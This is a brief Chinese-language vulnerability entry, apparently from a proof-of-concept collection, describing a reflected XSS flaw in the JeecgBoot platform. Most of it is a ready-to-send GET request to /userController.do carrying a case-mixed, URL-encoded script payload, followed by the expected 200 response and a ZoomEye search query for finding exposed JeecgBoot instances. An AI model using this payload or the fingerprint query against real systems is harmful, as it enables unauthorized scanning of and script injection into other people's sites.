# JeecgBoot反射型XSS漏洞

JeecgBoot ｜ XSS ｜ —
- **请求**：`GET /userController.do?%3CsCrIpT%3Ealert(document.domain)%3C/sCrIpT%3E HTTP/1.1`
- **响应特征**：200
- **其他**：Zoomeye语法: app:"Jeecg-Boot 企业级快速开发平台"